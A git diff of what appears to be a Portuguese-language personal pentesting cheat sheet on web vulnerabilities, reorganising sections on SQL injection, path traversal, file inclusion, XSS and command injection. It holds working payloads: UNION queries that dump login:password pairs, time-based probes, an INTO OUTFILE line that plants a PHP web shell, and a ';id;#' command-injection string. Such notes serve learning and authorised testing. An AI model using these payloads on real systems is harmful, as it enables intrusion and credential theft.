@@ -22,9 +22,9 @@ Download/Upload
 
 Posts
 
-# Vulnerabilidades
+# Vulnerabilities
 ## Directory and files Bruteforce
-Com o dirbuster é possível encontrar diretórios e arquivos escondidos no host através de bruteforce
+Com diversas ferramentas, é possível encontrar diretórios e arquivos escondidos no host através de bruteforce
 
 ## Method Bypass
 É possível ver o conteúdo de uma página que é necessário acesso administrativo utilizando outro método para acessar. Exemplo: Fazer uma requisição POST via curl para a página específicada
@@ -37,6 +37,13 @@ Em casos que o redirecionamento é feito pelo parâmetro GET e seja passível de
 
 ## SQL Injection
 Para testar se existe um SQL Injection, um método é colocar o contrabarra ou uma aspa simples em campos de input
+
+### Information Schema
+Através do information Schema, é possível obter a tabela com usuários e senhas do sistema e obter as informações contidas nela.
+
+Exemplo: ' union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema = "string" %23
+
+Exemplo: ' union select 1,2,concat(login,':',senha),4,5 from table %23
 
 ### Error Based
 O Error Based, como o próprio nome diz, é baseado nos erro que retorna ao tentar fazer uma consulta no banco de dados em algum campo. Com ele, é possível injetar códigos SQL para descobrir informações sobre a tabela e o banco de dados.
@@ -70,7 +77,6 @@ Exemplo: ‘ union all select 1,2,3,4, “string” INTO OUTFILE “/var/www/htm
 
 Exemplo: ‘ union all select 1,2,3,4, “<?php system($_GET[’parameter’]); ?>” INTO OUTFILE “/var/www/html/website/banners/file.php” %23
 
-
 ### Time Based
 O Time Based utiliza a função sleep() para verificar se existe uma vulnerabilidade de SQL Injection observando se a página demora para responder após enviar um sleep() em uma requisição ao banco de dados. Caso seja possível, pode-se utilizar o if para verificar informações sobre o banco de dados, tabelas e outras informações como nas outras vulnerabilidades
 
@@ -78,13 +84,6 @@ Exemplo: ' or sleep(5)#
 Exemplo: ' or if (length(database()) = 5, sleep(5), 0)#
 Exemplo: ' or if (database() = char(char(115,116,114,105,110,103)), sleep(5), 0)#
 Exemplo: ' or if (ascii(substring(database(), 1, 1)) = 100, sleep(5), 0)#
-
-### Information Schema
-Através do information Schema, é possível obter a tabela com usuários e senhas do sistema e obter as informações contidas nela.
-
-Exemplo: ' union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema = "string" %23
-
-Exemplo: ' union select 1,2,concat(login,':',senha),4,5 from table %23
 
 ### Bypass addslashes
 Em alguns casos, por causa do jeito em que foi programado a consultado no banco de dados, vai adicionar algumas contrabarras na consulta, impossibilitando de fazer consultas com aspas simples, gerando um erro. Porém, umas das formas de burlar esse mecanismos, é passar os valores da string em decimal separados por vírgulas com a função char().
@@ -94,7 +93,6 @@ Exemplo: echo -n “string” | od -An -tdC
 Exemplo:-1 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=char(115,116,114,105,110,103)
 
 Site: [https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html)
-
 
 ## Full Path Disclosure | Path Traversal | Directory Traversal
 O Path Traversal ou Directory Traversal é uma vulnerabilidade que ocorre quando é se é possível navegar entre os diretórios através de um parâmetro GET pela URL utilizando o "../" para listar todos os diretórios anteriores. Através dessa vulnerabilidade é possível encontrar arquivos sensíveis que se colocados na URL pode-se ver o conteúdo deles e encontrar informações confidenciais
@@ -108,6 +106,7 @@ Exemplo de código PHP: <?php system($_GET['parammeter']); ?>
 O Remote File Inclusion ocorre quando o servidor executa códigos remotamente de outro servidor, assim, é possível subir um servidor e enviar um código malicioso para o servidor, para executar códigos remotamente através de um parâmetro, assim como no RCE através de LFI
 ## HTML Injection
 O HTML Injection ocorre quando se é possível injetar códigos HTML na página
+
 
 ## Cross Site Scripting (XSS)
 ### Refletido
@@ -133,3 +132,11 @@ URL encoding replaces unsafe ASCII characters with a "%" followed by two hexadec
 URLs cannot contain spaces. URL encoding normally replaces a space with a plus (+) sign or with %20.
 
 Site for more informations about: https://www.w3schools.com/tags/ref_urlencode.ASP
+
+
+## Command Injection
+Essa vulnerabilidade se dá quando é possível injetar comandos do sistema operacional que não deveriam ser possíveis  através de algum campo .
+
+Exemplo de código vulnerável: whois <url> | grep "nserver"
+
+Exemplo de injeção de comando: whois ; id;# | grep "nserver"
